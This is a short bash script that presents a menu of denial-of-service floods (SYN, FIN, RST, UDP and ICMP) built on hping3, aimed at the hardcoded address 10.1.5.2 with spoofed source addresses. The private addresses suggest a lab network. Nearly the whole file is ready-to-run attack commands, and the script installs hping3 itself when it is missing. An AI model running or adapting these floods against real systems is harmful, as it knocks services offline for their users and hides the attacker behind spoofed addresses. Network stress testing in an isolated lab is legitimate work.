#!/bin/bash

server="10.1.5.2"

if ! which hping3 &> /dev/null
then
    echo "hping3 is not present on the system"
    echo "installing"
    sudo apt-get install hping3
fi

while true; do
    echo "Choose what to do."
    echo "[0] SYN Flood attack"
    echo "[1] FIN attack"
    echo "[2] RST attack:"
    echo "[3] UDP attack"
    echo "[4] ICMP attack"
    echo "[e] Exit"
    read -rp "> " option

    if [[ $option == 0 ]]; then
        echo "Running SYN Flood attack"
        #sudo hping3 -d 200 -p 80 -S --flood $server 

        echo "SYN Flood attack: Insert command line options [--tcp-mss [max segment size] -w [windows size] -a [spoofed ip]] -d [packet size]"
        read -rp "> " opts
        echo "Press ^C to stop the attack"
        if [ -z "$opts" ]; then
            sudo hping3 -S --flood --destport 80 -a 10.1.3.2 10.1.5.2 --tcp-mss 1460 -w 64240
        else
            sudo hping3 -S --flood --destport 80 10.1.5.2 "$opts"
        fi
        #sudo hping3 -S -p 80 -d 200 --flood --faster $server
    elif [[ $option == '1' ]]; then
        echo "Running FIN attack: "
        sudo hping3 --flood -a client3 -F -p 80 $server
        echo "Press ^C to stop the attack"
    elif [[ $option == '2' ]]; then
        echo "Running RST attack: "
        sudo hping3 --flood -a client3 -R -p 80 $server
        echo "Press ^C to stop the attack"
    elif [[ $option == '3' ]]; then
        echo "Running UDP attack: "
        sudo hping3 --flood -a client3 --udp -p 80 $server
        echo "Press ^C to stop the attack"
    elif [[ $option == '4' ]]; then
        echo "Running ICMP attack: "
        sudo hping3 --flood -a client3 -1 -p 80 $server
        echo "Press ^C to stop the attack"
    else
        echo "Invalid option"
        exit
    fi
done